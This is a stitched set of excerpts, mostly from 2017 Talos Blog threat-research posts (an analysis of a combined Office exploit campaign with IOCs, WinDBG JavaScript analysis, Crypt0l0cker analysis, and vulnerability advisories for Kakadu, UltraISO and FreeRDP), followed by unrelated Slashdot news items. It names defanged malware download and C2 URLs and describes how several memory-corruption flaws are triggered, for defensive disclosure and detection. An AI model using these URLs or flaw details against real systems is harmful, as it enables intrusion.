The other way, just slightly more complex, is to correctly handle cases when the next stage marker is not found within the RTF and assume that the targeted Word process already has other RTF documents opened which satisfy the file size condition.<br /><br />Interestingly enough, the shellcode in the document containing the CVE-2012-0158 exploit will be successfully executed if there are no other open RTF files so we analyzed the remainder for the sake of completeness. <br /><br /><h3 id=""h.1g5ixz26t8g5"">Second stage shellcode</h3><br />The second stage shellcode is a bit more complex and starts by finding required API functions within ntdll.dll.

In the case of this campaign the attackers made a major mistake that prevented the intended download and execution of the Ramnit payload. <br /><br /><div class=""separator"" style=""clear: both; text-align: center;""><a href=""https://3.bp.blogspot.com/-MfUPazA21cA/WZGOZLENF5I/AAAAAAAAAFg/40RcSVXGHtI-2ZXY5APAF5xYKnAQ_CT6gCLcBGAs/s1600/image11.png"" style=""margin-left: 1em; margin-right: 1em;""><img border=""0"" height=""360"" src=""https://3.bp.blogspot.com/-MfUPazA21cA/WZGOZLENF5I/AAAAAAAAAFg/40RcSVXGHtI-2ZXY5APAF5xYKnAQ_CT6gCLcBGAs/s640/image11.png"" width=""640"" /></a></div><div class=""separator"" style=""clear: both; text-align: center;"">Attempted combined attack stages</div><br />One has to wonder why did the attackers use the combination of a newer and an older exploit at all? The combination would not be executed if the targeted system had a patch against either of the exploits. In addition, if the targeted system was vulnerable to CVE-2012-0158 it would be much easier for the attackers to use a single exploit targeting this vulnerability.<br /><br />An assumption we can make is that that the attackers used the combination to avoid Word displaying the prompt which may raise suspicions for the target end user. Another possibility is that they attempted to use this combination in order to avoid behavioral detection systems which may be triggering on the combination of Ole2Link in a word document and a download of an HTA file. <br /><br />This attack was unsuccessful, potentially indicating poor testing or quality control procedures by the attackers. However, this does show a level of experimentation by attackers seeking to use CVE-2017-0199 as a means to launch additional weaponized file types and avoid user prompts. This attack may have been an experiment that didn't quite work out, or it may be indication of future attacks yet to materialise.<br /><br /><h3 id=""h.8lbs60io8ukk"">Coverage</h3><br /><a href=""https://4.bp.blogspot.com/-zNZW_D3mzfQ/WZGPG8nwAfI/AAAAAAAAAFo/LxZYPEg5C_oqhE-nw0dPwwHFumoST5yTwCLcBGAs/s1600/image8.png"" style=""clear: left; float: left; margin-bottom: 1em; margin-right: 1em;""><img border=""0"" height=""268"" src=""https://4.bp.blogspot.com/-zNZW_D3mzfQ/WZGPG8nwAfI/AAAAAAAAAFo/LxZYPEg5C_oqhE-nw0dPwwHFumoST5yTwCLcBGAs/s320/image8.png"" width=""320"" /></a>Advanced Malware Protection (AMP) is ideally suited to prevent the execution of the malware used by these threat actors.<br /><br />CWS or WSA web scanning prevents access to malicious websites and detects malware used in these attacks.<br /><br />Email Security can block malicious emails sent by threat actors as part of their campaign.<br /><br />Network Security appliances such as NGFW, NGIPS, and Meraki MX with Advanced Security can detect malicious activity associated with this threat.<br /><br />AMP Threat Grid helps identify malicious binaries and build protection into all Cisco Security products.<br /><br />Umbrella prevents DNS resolution of the domains associated with malicious activity.<br /><br />Stealthwatch detects network scanning activity, network propagation, and connections to CnC infrastructures, correlating this activity to alert administrators.<br /><h3 id=""h.3lh94s3hk6jp"">IOCs</h3><br />Documents<br /><br />5ae2f13707ee38e4675ad1bc016b19875ee32312227103d6f202874d8543fc2e - CVE-2017-0199<br />6a84e5fd6c9b2c1685efc7ac8d763048913bad2e767b4958e7b40b4488bacf80 - CVE-2012-0158<br /><br />Executables<br /><br />351aec22d926b4fb7efc7bafae9d1603962cadf0aed1e35b1ab4aad237723474<br />f34e5af97ccb3574f7d5343246138daf979bfd1f9c37590e9a41f6420ddb3bb6<br />43624bf57a9c7ec345d786355bb56ca9f76c226380302855c61277bdc490fdfe<br />d4fbca06989a074133a459c284d79e979293625262a59fbd8b91825dbfbe2a13<br /><br />URLs<br /><br />hxxp://multplelabs[dot]com/ema/order.doc - CVE-2012-0158<br />hxxp://multplelabs[dot]com/ema/nextyl.exe - dropper<br />hxxp://multplelabs[dot]com/freem/50/fre.php - Lokibot C2<br /><br /><div class=""feedflare"">

Our <a href=""http://blog.talosintelligence.com/2017/07/unravelling-net-with-help-of-windbg.html"">previous article</a> on .NET analysis generated much interest relating to how to use WinDBG to analyse .js files. In this post we extend our description of using WinDBG to describe the analysis of JavaScript using the 64 bit version of wscript.exe.

This can be achieved by using the ActiveXObject() API (to load ActiveX objects) or WScript.CreateObject() API (to load COM objects). The mechanisms behind these 2 API are the same: loading an external library to enable access to new objects. Here are 2 examples:<br /><pre>new ActiveXObject(""Shell.Application"");<br />WScript.CreateObject(""Wscript.Shell"");<br /></pre>The first point is to understand which library is behind these two objects. This information is stored in the registry. First we need to get the CLSID associated to the object name in the following registry name: HKEY_CLASSES_ROOT\OBJECT_NAME\CLSID.  <br /><br />Here is an example for the Shell.Application object name: <br /><div class=""separator"" style=""clear: both; text-align: center;""><a href=""https://4.bp.blogspot.com/-8iSHJLsGO4w/WYrurRFgvII/AAAAAAAAAKg/6vc7VBTruowQAhZCXmwX2899hGvUjyKmgCLcBGAs/s1600/image2.png"" style=""margin-left: 1em; margin-right: 1em;""><img border=""0"" height=""162"" src=""https://4.bp.blogspot.com/-8iSHJLsGO4w/WYrurRFgvII/AAAAAAAAAKg/6vc7VBTruowQAhZCXmwX2899hGvUjyKmgCLcBGAs/s640/image2.png"" width=""640"" /></a></div>This shows that the CLSID is {13709620-C279-11CE-A49E-444553540000}.

2017-08-08 03:43:14+08:00,On Conveying Doubt,Talos Blog,"<i>This post was authored by <a href=""https://twitter.com/kpyke"" target=""_blank"">Matt Olney</a>.</i><br /><br />Typically, Talos has the luxury of time when conducting research. We can carefully draft a report that clearly lays out the evidence and leads the reader to a clear understanding of our well supported findings. A great deal of time is spent ensuring that the correct words and logical paths are used so that we are both absolutely clear and absolutely correct. &nbsp;Frequently, the goal is to inform and educate readers about specific threats or techniques.<br /><br />There are times, however, when we are documenting our research in something very close to real-time. The recent WannaCry and Nyetya events are excellent examples of this. Our goal changes here, as does our process. Here we are racing the clock to get accurate, impactful, and actionable information to help customers react even while new information is coming in.<br /><br />In these situations, and in certain other kinds of investigations, it is necessary for us to talk about something when we aren’t 100% certain we are correct. &nbsp;I’ll provide two examples from our Nyetya blog posts:  <br /><a name=""more""></a><h3>Example 1:</h3><i><a href=""http://blog.talosintelligence.com/2017/06/worldwide-ransomware-variant.html"" target=""_blank"">“Given the circumstances of this attack, Talos assesses with high confidence that the intent of the actor behind Nyetya was destructive in nature and not economically motivated.</a></i><a href=""http://blog.talosintelligence.com/2017/06/worldwide-ransomware-variant.html"" target=""_blank""><i>”</i> </a><br /><br />This is our response to customers who were asking “If I pay will I get my data back?”. &nbsp;&nbsp;There were a number of indications that made us think that this was unlikely, but we couldn’t necessarily prove that there was no way it could occur at the time we published. &nbsp;We weren’t certain, but it was important to share our analysis quickly because customers needed information in order to make time-sensitive decisions, so we did so with a clear statement that there was room for error.<br /><br /><h3>Example 2:</h3><i><a href=""http://blog.talosintelligence.com/2017/07/the-medoc-connection.html"" target=""_blank"">“This is a significant loss in operational capability, and the Threat Intelligence and Interdiction team assesses with moderate confidence that it is unlikely that they would have expended this capability without confidence that they now have or can easily obtain similar capability in target networks of highest priority to the threat actor.” </a></i><br /><br />Here we are speaking about an actor’s thought process. &nbsp;Obviously we aren’t in a position to authoritatively speak about what is going through an actor’s head. &nbsp;But we can look at a broad set of circumstances, analyze them in the light of our past observations and experiences, and then try to understand what underlying meaning they might have. &nbsp;Based on what we saw, we thought it important to express that the actor may have additional capability it had not shown, so again, we spoke in plain language that gave the reader information they could evaluate.<br /><br />Speaking with doubt doesn’t mean guessing. &nbsp;At Talos it means applying experience and knowledge to a set of information that is incomplete and trying to extract actionable intelligence from that information. &nbsp;When we document our findings externally, we are under an obligation to be crystal clear if we are engaging in some form of speculation in order to develop a thoughtful assessment based on strong indicators. &nbsp;This doesn’t make the information less valuable, but it does allow the reader to correctly weigh the information when prioritizing their own response. &nbsp;As we move ahead, when Talos communicates doubt, we will do so using the following as guidance:<br /><br /><table style=""border-collapse: collapse; border: none;""><colgroup><col width=""375"" /><col width=""217"" /></colgroup><tbody><tr style=""height: 25pt;""><td style=""padding: 5pt 5pt 5pt 5pt; vertical-align: top;"">Phrase </td><td style=""padding: 5pt 5pt 5pt 5pt; vertical-align: top;"">Estimated % Confidence </td></tr><tr style=""height: 25pt;""><td style=""padding: 5pt 5pt 5pt 5pt; vertical-align: top;"">Low Confidence / Possible / Unlikely </td><td style=""padding: 5pt 5pt 5pt 5pt; vertical-align: top;"">&lt;35% </td></tr><tr style=""height: 25pt;""><td style=""padding: 5pt 5pt 5pt 5pt; vertical-align: top;"">Moderate Confidence / Probable / Likely </td><td style=""padding: 5pt 5pt 5pt 5pt; vertical-align: top;"">35% - 69% </td></tr><tr style=""height: 25pt;""><td style=""padding: 5pt 5pt 5pt 5pt; vertical-align: top;"">High Confidence / Highly Probable / Highly Likely </td><td style=""padding: 5pt 5pt 5pt 5pt; vertical-align: top;"">&gt;70% </td></tr></tbody></table><br />Our primary mission is to place into our reader’s hands the information they need to defend their systems and their networks. &nbsp;We can’t always wait until we are 100% certain of findings, particularly while we are in the midst of an incident. &nbsp;By utilizing this language, we can share findings earlier and give customers the ability to evaluate our information and apply it to their defenses if necessary.<div class=""feedflare"">

The vulnerabilities manifest in a way that could be exploited if a user opens a specifically crafted JPEG 2000 file. Talos has coordinated with Kakadu to ensure relevant details regarding the vulnerabilities have been shared. In addition, Talos has developed Snort Rules that can detect attempts to exploit these flaws.<br /><br /><a name=""more""></a><br /><br /><h2>Vulnerability Details</h2><div><br /></div><div>Code execution vulnerabilities exist in the Kakadu SDK 7.9 which are detailed in the Talos vulnerability reports&nbsp;<a href=""https://talosintelligence.com/reports/TALOS-2017-0308"">TALOS-2017-0308</a>&nbsp;and&nbsp;<a href=""https://talosintelligence.com/reports/TALOS-2017-0309"">TALOS-2017-0309</a>. In both vulnerabilities a specially crafted JPEG 2000 file can be read by the program and can lead to an out of bounds write causing an exploitable condition to arise.&nbsp;The most likely form of attack would be in a social engineering scenario where a user receives an email containing a malicious JPEG 2000 file that exploits this vulnerability.</div><div><br /></div><h2>Coverage</h2><br />Talos has developed the following Snort rules to detect attempts to exploit this vulnerability.

2017-08-03 23:36:13+08:00,Taking the FIRST look at Crypt0l0cker,Talos Blog,"<i>This post is authored by <a href=""https://blogs.cisco.com/author/matthewmolyett"">Matthew Molyett</a>.</i><br /><br /><h2 id=""h.706dmmcqqcm0"">Executive Summary</h2>In March, Talos reported on the details of <a href=""http://blog.talosintelligence.com/2017/03/crypt0l0cker-torrentlocker-old-dog-new.html"">Crypt0l0cker</a> based on an extensive analysis I carried out on the sample binaries. Binaries -- plural -- because, as noted in the original blog, the Crypt0l0cker payload leveraged numerous executable files which shared the same codebase. Those executables had nearly identical functions in each, but identifying all of those functions repeatedly is tedious and draws time away from improving the analysis. Enter <a href=""http://blog.talosintelligence.com/2016/12/project-first-share-knowledge-speed-up.html"">FIRST</a>, the Function Identification and Recovery Signature Tool released by Talos in December 2016.<br /><br /><a href=""http://first-plugin.us/"">FIRST</a> allowed me to port my analysis from the unpacking dll to the payload file instantly. Once I was satisfied my analysis across both files, I was then handed a suspected previous version of the sample. <a href=""https://github.com/vrtadmin/FIRST"">FIRST</a> was able to identify similar code across the versions and partially port the analysis back to the older file. When the next version of Crypt0l0cker comes out, I will be able to get a jump on my analysis by using FIRST to port that work forward to the similar code. You can use it to port my work to your sample as well. I will demonstrate doing just that with a Crypt0l0cker sample which appeared on VirusTotal in April 2017, more than a month after the Talos blog about it. There has been no targeted analysis of this file to provide background for this post.<br /><br /><h2 id=""h.q915oovw849k"">Locating the Sample</h2>Procuring a malware sample of a known family without analyzing it can feel like a heavy challenge to overcome. Thankfully, Talos can leverage Threat Grid sandbox reports of suspected malware samples that we receive. Such reports can be scanned for family IOCs. Per our previous analysis into Crypt0l0cker, the infection status of that version is stored in a file named ewiwobiz. By searching <a href=""http://www.cisco.com/c/en/us/products/security/threat-grid/index.html"">Cisco Threat Grid</a> telemetry for files which created ewiwobiz, I identified a file which was probably a Crypt0l0cker executable.<br /><a name=""more""></a><br /><div class=""separator"" style=""clear: both; text-align: center;""><a href=""https://2.bp.blogspot.com/-euyICRMwsSM/WYIx1ZvKwoI/AAAAAAAABM8/KgkQBcrq5dMhrAhyToEBL4P0xyqFTuFjgCLcBGAs/s1600/image2.png"" style=""margin-left: 1em; margin-right: 1em;""><img border=""0"" height=""412"" src=""https://2.bp.blogspot.com/-euyICRMwsSM/WYIx1ZvKwoI/AAAAAAAABM8/KgkQBcrq5dMhrAhyToEBL4P0xyqFTuFjgCLcBGAs/s640/image2.png"" width=""640"" /></a></div><br />With a report to investigate, I needed to procure the actual sample. My sandbox report shows that the suspected Crypt0l0cker file is nearly 400 kb and likely a <a href=""https://en.wikipedia.org/wiki/Nullsoft_Scriptable_Install_System"">Nullsoft Installer</a> file, which is a common packager.

From previous extraction of Crypt0l0cker files protected with NullSoft I already knew that the install script consisted of consuming multiple encrypted blobs, internally decrypt the payload, and run it via <a href=""https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process"">Process Hollowing</a>. As such, allowing it to run debugged and breaking on WriteProcessMemory should present the payload buffer to me.<br /><br />There was a complication though, because the install script loaded and unloaded System.dll many times. The ModLoad notification caused the debugger to consume the majority of the process cycles, effectively causing a denial of service against the debugger.

2017-08-02 17:47:09+08:00,Vulnerability Spotlight: EZB Systems UltraISO ISO Parsing Code Execution Vulnerability,Talos Blog,"Discovered by Piotr Bania of Cisco Talos.<br /><br />Today, Talos is releasing details of a new vulnerability discovered within the EZB Systems UltraISO ISO disk image creator software. TALOS-2017-0342 (CVE-2017-2840) may allow an attacker to execute arbitrary code remotely on the vulnerable system when a specially crafted ISO image is opened and parsed by the UltraISO software. <br /><h3 id=""h.wtl7h8em48en"">Overview</h3><br />The vulnerability is present in the EZB Systems UltraISO software,  an ISO CD/DVD image file creating/editing/converting tool and a bootable CD/DVD maker. UltraISO can directly edit the CD/DVD image file and extract files and folders from it, as well as directly make ISO files from a CD/DVD-ROM or hard drive. <br /><br />ISO (9660) disk image format is a file system within a single file. Essentially, it is a binary copy of the file system used by the standard software CD-ROM installation disks. Today, most of the installation disks for popular software and operating systems are distributed using the ISO file format. <br /><a name=""more""></a><br /><h3 id=""h.hyi3fl44doli"">Technical details</h3><br />A buffer overflow vulnerability exists within EZB Systems UltraISO. After ""NM"" entry is located in the .ISO file UltraISO executes _strncpy function with maxlen argument calculated directly from the ISO header byte field NM_hdr.len - length of alternate name.<br /><br />UltraISO assumes this field is always larger than 5 bytes. However, if an attacker forces it to be<br />less than that value the maxlen parameter for the _strncpy function will be extremely big (NM_hdr.len - 5, result is unsigned). <br /><br />Later, the memset function (inside the _strncpy function) is executed where the extremely big size parameter is used which leads to memory corruption and potential remote code execution.<br /><br />More details of the vulnerability can be found in the report <a href=""http://www.talosintelligence.com/reports/TALOS-2017-0342/"">TALOS-2017-0342</a>.<br /> <h3 id=""h.1jnf2m1x78fz"">Discussion</h3><br />ISO 9660 file format is one of the older formats and its original specification contains several limitations on the file name length, directory depth as well as the maximum file size. These limitations are inherited from older operating systems. Specifically, filename lengths in ISO 9660 file system are limited to maximum 8 characters with maximum 3 characters reserved for the file extension.<br /><br />Over time, various extensions have been developed to overcome the limitation of the original file format specification. One of the extensions, so called Rock Ridge extension, allows for alternative names to the original file. The alternative name can be longer than the default 8 characters. <br /><br />A vulnerability in UltraISO software exists when parsing the alternative name (NM) System Use Entry. The structure of the alternative name contains a single byte length field which can be manipulated by the attacker to cause a buffer overflow that may allow remote code execution of code in the context of the UltraISO user.<br /><br />Although third party disk image utilities can be useful in many cases, it is worth checking if the default operating system functionality satisfies user's needs. Specifically, Windows 8 and later has the built-in capability to mount ISO images, which may remove the need for third party disk imaging utilities.<br /><br />Users that still have a requirement for a third party disk imaging software should ensure that security updates are applied for the product as soon as they are released to remediate potential attack vectors.  <br /><h3>Affected versions</h3><br />UltraISO version prior to 9.7.0.3476, which includes a fix for the vulnerability.  <br /><h3 id=""h.qkzvaf12pu0"">Coverage</h3><br />The following Snort Rules will detect exploitation attempts. Note that additional rules may be released at a future date and current rules are subject to change pending additional vulnerability information. For the most current rule information, please refer to your FireSIGHT Management Center or Snort.org.<br /><br />Snort Rules: 43000 - 43001 <br /><br /><div class=""feedflare"">

2017-07-24 23:26:02+08:00,Vulnerability Spotlight: FreeRDP Multiple Vulnerabilities,Talos Blog,"<div>Vulnerabilities discovered by Tyler Bohan of Talos</div><br /><h2>Overview</h2><br /><div>Talos has discovered multiple vulnerabilities in the FreeRDP product. FreeRDP is a free implementation of the Remote Desktop Protocol (RDP) originally developed by Microsoft. RDP allows users to connect remotely to systems so they can be operated from afar. The open source nature of the FreeRDP library means that it is integrated into many commercial remote desktop protocol applications.</div><br />   <div>We identified a number of vulnerabilities falling into 2 classes:</div><ul><li>2 Code Executions; <li>4 Denials Of Service.</ul> <div>The first category allows code execution on the client side through a specially crafted response from a RDP server. The second category can cause the termination of the FreeRDP client. The vulnerabilities result from weaknesses in the handling of network packets sent from the RDP server. Indeed, the size of the data needed to be parsed is sent from the server without checks on the client side. An attacker can compromise the server or use a man in the middle attack to trigger these vulnerabilities.</div><br /><a name=""more""></a><h2>Details</h2><h2>Code Execution</h2>  <h3>TALOS-2017-0336 (CVE-2017-2834) - FreeRDP Rdp Client License Recv Code Execution Vulnerability</h3><br /><div>The vulnerability is located in the license server handling. The license message sent by the server contains a length field, which is not correctly verified by FreeRDP. For internal purposes, the library decreases this value by 4, if the server is sent a value inferior to 3, this will result in a negative value and the writing of packet contents outside of the allocated buffer in memory. This vulnerability can allow the execution of arbitrary code on the FreeRDP client side. </div><br /> <div>More details can be found in the vulnerability report: <a href=""https://www.talosintelligence.com/vulnerability_reports/TALOS-2017-0336"">TALOS-2017-0336</a></div> <h3>TALOS-2017-0337 (CVE-2017-2835) - FreeRDP RDP Client Recv RDP Code Execution Vulnerability</h3><br /><div>The vulnerability is located in the RDP received function of FreeRDP. Similar to the previous vulnerability, the RDP message sent from the server contains a length field, but this field is not verified by the FreeRDP client code. This length can become negative and allows the attacker to execute code on the client side.</div><br /><div>More details can be found in the vulnerability report: <a href=""https://www.talosintelligence.com/vulnerability_reports/TALOS-2017-0337"">TALOS-2017-0337</a></div><br /><h2>Denial Of Service</h2><h3>TALOS-2017-0338 (CVE-2017-2836) - FreeRDP RDP Client Read Server Proprietary Certificate Denial of Service Vulnerability</h3><br /><div>The vulnerability is located in the parsing of proprietary certificates. In this function, the public key is parsed by the FreeRDP library. However the size of the key specified in the server message packet is inferior to 8, the FreeRDP library crashes. </div><br /><div>More details can be found in the vulnerability report: <a href=""https://www.talosintelligence.com/vulnerability_reports/TALOS-2017-0338"">TALOS-2017-0338</a></div>  <h3>TALOS-2017-0339 (CVE-2017-2837) - FreeRDP RDP Client GCC Read Server Security Data Denial of Service Vulnerability</h3><br /><div>This vulnerability is located in the handling of security data function. The function reads a length value from the server packet. A malicious actor can send a specially crafted packet with a modified length value causing the client to crash and causing a denial of service condition.</div><br /><div>More details can be found in the vulnerability report: <a href=""https://www.talosintelligence.com/vulnerability_reports/TALOS-2017-0339"">TALOS-2017-0339</a></div> <h3>TALOS-2017-0340 (CVE-2017-2838) - FreeRDP RDP Client License Read Product Info Denial of Service Vulnerability</h3><br /><div>The vulnerability is located in the license read product info handling. A malicious crafted packet may cause the application to crash. The vulnerable code reads in an unsigned integer from the server message which then incremented by  four as part of a length check.  However, the size of the unsigned integer is never validated and thus the addition of four could cause an overflow and result in the client crashing.</div><br /><div>More details can be found in the vulnerability report: <a href=""https://www.talosintelligence.com/vulnerability_reports/TALOS-2017-0340"">TALOS-2017-0340</a></div> <h3>TALOS-2017-0341 (CVE-2017-2839) - FreeRDP RDP Client License Read Challenge Packet Denial of Service Vulnerability</h3><br /><div>The vulnerability is located in the license read challenge packet handling. A malicious crafted packet may cause the application to crash. The vulnerability is the same than on TALOS-2017-0340 previously mentioned.</div><br /><div>More details can be found in the vulnerability report: <a href=""https://www.talosintelligence.com/vulnerability_reports/TALOS-2017-0341"">TALOS-2017-0341</a></div><br /><div>Tested Versions:</div><div>FreeRDP 2.0.0-beta1+android11 - Windows, OSX, Linux</div> <br /><h2>Coverage</h2><br /><div>The following Snort Rules will detect exploitation attempts.

2017-09-14 15:00:00+08:00,Japan Trials Driverless Cars In Bid To Keep Rural Elderly On the Move,Slashdot,"According to Reuters, Japan is starting to experiment with self-driving buses in rural communities such as Nishikata, 71 miles (115 km) north of the capital, Tokyo, where elderly residents struggle with fewer bus and taxi services as the population ages and shrinks. From the report: The swift advance of autonomous driving technology is prompting cities such as Paris and Singapore to experiment with such services, which could prove crucial in Japan, where populations are not only greying, but declining, in rural areas.Japan could launch self-driving services for remote communities by 2020, if the trials begun this month prove successful. The government plans to turn highway rest stops into hubs from which to ferry the elderly to medical, retail and banking services. In the initial trials of the firm's driverless six-seater Robot Shuttle, elderly residents of Nishikata, in Japan's Tochigi prefecture, were transferred between a service area and a municipal complex delivering healthcare services. The test also checked the vehicle's operational safety in road conditions ranging from puddles to fallen debris, and if those crossing its path would react to the warning it emits.<p><div class=""share_submission"">

2017-09-14 11:30:00+08:00,"Climate Change Could Wipe Out a Third of Parasite Species, Study Finds",Slashdot,"An anonymous reader quotes a report from The New York Times (Warning: source may be paywalled, alternative source): Recently, scientists carried out the first large-scale study of what climate change may do to the world's much-loathed parasites. The team came to a startling conclusion: as many as one in three parasite species may face extinction in the next century. As global warming raises the planet's temperature, the researchers found, many species will lose territory in which to survive. Some of their hosts will be lost, too. Researchers have begun carefully studying the roles that parasites play. They make up the majority of the biomass in some ecosystems, outweighing predators sharing their environments by a factor of 20 to 1. For decades, scientists who studied food webs drew lines between species -- between wildebeest and the grass they grazed on, for example, and between the wildebeest and the lions that ate them. In a major oversight, they didn't factor in the extent to which parasites feed on hosts. As it turns out, as much as 80 percent of the lines in a given food web are links to parasites. They are big players in the food supply.
 
Some researchers had already investigated the fate of a few parasite species, but Colin J. Carlson, lead author of the study and a graduate student at the University of California, Berkeley, and his colleagues wanted to get a global view of the impact of climate change. Some kinds won't lose much in a warming world, the study found. For instance, thorny-headed worms are likely to be protected because their hosts, fish and birds, are common and widespread. But other types, such as fleas and tapeworms, may not be able to tolerate much change in temperature; many others infect only hosts that are facing extinction, as well. In all, roughly 30 percent of parasitic species could disappear, Mr. Carlson concluded. The impact of climate change will be as great or greater for these species as for any others studied so far. The study has been published in Science Advances.<p><div class=""share_submission"">

2017-09-14 09:30:00+08:00,Target's Sales Floors Are Switching From Apple To Android Devices,Slashdot,"After three years of Apple products, Target is moving to Android devices for stocking, pulling items, and other essential sales floor duties. Target first outfitted its employees with Apple products in 2014, replacing PDAs with iPod Touches. Gizmodo reports: In Fall of 2016, Target stores began testing the Zebra TC51, which runs Android 6.0 Mashmallow and was confirmed to Gizmodo as ""the new MyDevices for store team members chainwide"" by a company spokesperson over email. On Reddit's r/Target page and the unofficial employee forum The Breakroom, the new devices have been met with enthusiasm -- and plenty of jabs at the old iOS scanners. ""The current iOS my devices we have all sorts of issues, connection issues, scanner issues, and tons more,"" one Breakroom poster complained. On Reddit, a former store manager wrote that ""the iPod hardware they used as on the floor scanners for employees died quickly and there was no way of swapping in new batteries. There were many hardware issues that came about with the ipods."" While a Target spokesperson confirmed the company will still purchase some products from Apple -- iPads for online order pickups, iPhones for managers -- the sales floor is switching to Android, and the company is staffing up on Android developers to port over all the internal software stores use.<p><div class=""share_submission"">

2017-09-14 08:50:00+08:00,"Backdoor Found In WordPress Plugin With More Than 200,000 Installations",Slashdot,"According to Bleeping Computer, a WordPress plug that goes by the name Display Widgets has been used to install a backdoor on WordPress sites across the internet for the past two and a half months. While the WordPress.org team removed the plugin from the official WordPress Plugins repository, the plugin managed to be installed on more than 200,000 sites at the time of its removal. The good news is that the backdoor code was only found between Display Widgets version 2.6.1 (released June 30) and version 2.6.3 (released September 2), so it's unlikely everyone who installed the plugin is affected. WordPress.org staff members reportedly removed the plugin three times before for similar violations. Bleeping Computer has compiled a history of events in its report, put together with data aggregated from three different investigations by David Law, White Fir Design, and Wordfence. The report adds: The original Display Widgets is a plugin that allowed WordPress site owners to control which, how, and when WordPress widgets appear on their sites. Stephanie Wells of Strategy11 developed the plugin, but after switching her focus to a premium version of the plugin, she decided to sell the open source version to a new developer who would have had the time to cater to its userbase. A month after buying the plugin in May, its new owner released a first new version -- v2.6.0 -- on June 21.<p><div class=""share_submission"">

2017-09-14 08:10:00+08:00,"iPhone 8 and iPhone X Will Support Fast Charging, But Only If You Buy a New USB-C Charger",Slashdot,"One little detail Apple didn't mention at its event in Cupertino, California yesterday was the fact that the new iPhones will support fast charging. According to the official tech specs page, the new iPhones can recharge up to 50 percent of their battery life in a 30-minute charge. The catch? You have to use a USB-C charger and Lightning cable (sold separately). 9to5Mac reports: iPhone 8 battery life is roughly equivalent to the iPhone 7 and iPhone 7 Plus. On a full charge, expect up to 12 hours of internet usage on iPhone 8 and iPhone X, with up to 13 hours on iPhone 8 Plus. With a 50% quick charge in 30 minutes, you are effectively gaining hours of additional battery life during the day, even if you only plug in for a short period. However, to take advantage of fast-charging, you cannot use the Lightning to USB-A cable that is bundled in the box. Fast charging requires a USB-C to Lightning cable and the USB-C wall charger. More specifically, one of three USB-C wall chargers. Apple sells 29W, 61W and 87W variants of its USB-C power adapters. Prices range from $49 to $79. Apple doesn't break out specific numbers on how each model affects charging times, it's not clear if the cheapest 29W model can achieve the advertised 50% recharge in 30 minutes.<p><div class=""share_submission"">

2017-09-14 07:30:00+08:00,Samsung Unveils New Electric Car Batteries For Up To 430 Miles of Range,Slashdot,"An anonymous reader quotes a report from Electrek: At the Frankfurt Motor Show (IAA Cars 2017) this week, Samsung's battery division, Samsung SDI, showcases a new ""Multifunctional battery pack"" solution to enable more range in electric vehicles as the Korean company tries to carve itself a bigger share of the growing automotive battery market. Most established automakers, like Nissan with the LEAF or even GM with the more recent Chevy Bolt EV, have been using large prismatic cells to build their electric vehicle battery packs. Tesla pioneered a different approach using thousands of individual smaller cylindrical li-ion battery cells in each pack. Earlier this year, Samsung unveiled its own '2170' battery cell to compete with Tesla/Panasonic. Now they are claiming that they can reach an impressive energy density by using those cells in new modules: ""'Multifunctional battery pack' of Samsung SDI attracted the most attention. Its users can change the number of modules as they want as if they place books on a shelf. For example, if 20 modules are installed in a premium car, it can go 600 to 700 kilometers. If 10 to 12 modules are mounted on a regular sedan, it can run up to 300 kilometers.

2017-09-14 06:50:00+08:00,Ford Disguised a Man As a Car Seat To Research Self-Driving,Slashdot,"According to TechCrunch, Ford put a man in a car seat disguise so that a Ford Transit could masquerade as a true self-driving vehicle in order to evaluate how passers-by, other drivers on the road and cyclists reacted to sharing the road with an autonomous vehicle. From the report: The trial, conducted with the Virginia Tech Transportation Institute, also made use of a light bar mounted on the top of the windshield to provide communication about what the car was doing, including yielding, driving autonomously or accelerating from a full stop. The Transit Connect van used for the trial would indicate its behavior using signals including a slow white pulse for yielding, a rapid blinking for accelerating from a stop, and staying solid if it's actively in self-driving mode. The bar is positioned roughly where a driver's eye line would be, to try to catch the attention of those around it who would look in its direction.<p><div class=""share_submission"">

2017-09-14 06:10:00+08:00,Apple's 'Shoddy' Beats Headphones Get Slammed In Lawsuit,Slashdot,"A lawsuit (PDF) filed Tuesday in U.S. District Court in Oakland, California, recounts the frustrations of five plaintiffs who found that Apple's Powerbeats 2 and Powerbeats 3 headphones did not perform as advertised. They are also claiming the company is refusing to honor warranty commitments to repair or replace the failed units. The Register reports: The complaint seeks $5,000,000 in damages and class action certification, in order to represent thousands of similarly afflicted Beats customers who are alleged to exist. ""In widespread advertising and marketing campaigns, Apple touts that its costly Powerbeats (which retail for $199.95) are 'BUILT TO ENDURE' and are the 'BEST HEADPHONES FOR WORKING OUT,'"" the complaint says. ""But these costly headphones are neither 'built to endure' nor 'sweat &amp; water resistant,' and certainly do not have a battery that lasts for six or twelve hours. Instead, these shoddy headphones contain a design defect that causes the battery life to diminish and eventually stop retaining a charge.""
 
The complaint attributes the shoddiness of Apple's Powerbeats headphones to cheap components. Citing an estimate in a recent Motley Fool article, the complaint contends that Apple's Beats Solo headphones cost $16.89 to make and retail for $199.95: a markup of more than 1,000 per cent. That figure actually comes from a Medium post by Avery Louie, from hardware prototyping biz Bolt.<p><div class=""share_submission"">

2017-09-14 05:30:00+08:00,"Study Finds That Banning Trolls Works, To Some Degree",Slashdot,"An anonymous reader quotes a report from Motherboard: On October 5, 2015, facing mounting criticism about the hate groups proliferating on Reddit, the site banned a slew of offensive subreddits, including r/Coontown and r/fatpeoplehate, which targeted Black people and those with weight issues. But did banning these online groups from Reddit diminish hateful behavior overall, or did the hate just spread to other places? A new study from the Georgia Institute of Technology, Emory University, and University of Michigan examines just that, and uses data collected from 100 million Reddit posts that were created before and after the aforementioned subreddits were dissolved. Published in the journal ACM Transactions on Computer-Human Interaction, the researchers conclude that the 2015 ban worked. More accounts than expected discontinued their use on the site, and accounts that stayed after the ban drastically reduced their hate speech. However, studies like this raise questions about the systemic issues facing the internet at large, and how our culture should deal with online hate speech. First, the researchers automatically extracted words from the banned subreddits to create a dataset that included hate speech and community-specific lingo. The researchers looked at the accounts of users who were active on those subreddits and compared their posting activity from before and after those offensive subreddits were banned. The team was able to monitor upticks or drops in the hate speech across Reddit and if that speech had ""migrated"" to other subreddits as a result.<p><div class=""share_submission"">

